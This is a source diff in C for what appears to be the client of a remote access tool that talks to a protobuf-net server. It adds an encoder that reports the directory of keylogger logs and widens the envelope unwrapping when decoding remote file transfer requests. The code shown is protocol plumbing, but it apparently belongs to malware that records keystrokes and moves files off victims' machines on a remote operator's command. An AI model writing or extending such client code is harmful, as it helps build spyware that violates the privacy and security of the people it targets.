@@ -460,6 +460,12 @@ unsigned int remote_proto_encode_get_directory_response(const char* remote_path,
     return pos;
 }
 
+/* GetKeyloggerLogsDirectoryResponse: field 1 LogsDirectory (string). */
+unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, unsigned char* out, unsigned int out_size) {
+    if (!out || !logs_directory || out_size < 16) return 0;
+    return put_string(out, out_size, 1, logs_directory);
+}
+
 /* Parse FileTransferChunk body when receiving from server. Unwrap field-32 or field-34 if present, then parse Id, FilePath, FileSize, Chunk. */
 int remote_proto_decode_file_transfer_chunk(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size, long long* out_file_size, long long* out_offset, unsigned char* data_buf, unsigned int data_buf_size, unsigned int* out_data_len) {
     if (!body || !out_id || !path_buf || !out_file_size || !out_offset || !data_buf || !out_data_len) return 0;
@@ -552,18 +558,18 @@ int remote_proto_decode_file_transfer_chunk(const unsigned char* body, unsigned 
 }
 
 /* Parse FileTransferRequest body: field 1 Id (varint), field 2 RemotePath (string).
- * Server (protobuf-net) may send body wrapped as field 34 length-delimited; unwrap once. */
+ * Server (protobuf-net) may wrap body in length-delimited envelope (field 34, 42, etc); unwrap once. */
 int remote_proto_decode_file_transfer_request(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size) {
     if (!body || !out_id || !path_buf || path_buf_size == 0) return 0;
     *out_id = 0;
     path_buf[0] = '\0';
     const unsigned char* parse = body;
     unsigned int parse_len = body_len;
-    /* Unwrap: server may send (field 34, wire 2) + length + inner message. Tag 274 = (34<<3)|2. */
     if (parse_len >= 3) {
-        unsigned int tag_consumed = 0, len_consumed = 0;
+        unsigned int tag_consumed = 0;
         unsigned int tag_val = read_varint(parse, parse_len, &tag_consumed);
-        if (tag_val == 274u && tag_consumed > 0 && tag_consumed < parse_len) {
+        if (tag_consumed > 0 && (tag_val & 7) == 2) {
+            unsigned int len_consumed = 0;
             unsigned int inner_len = read_varint(parse + tag_consumed, parse_len - tag_consumed, &len_consumed);
             if (len_consumed > 0 && inner_len > 0 && tag_consumed + len_consumed + inner_len <= parse_len) {
                 parse = parse + tag_consumed + len_consumed;
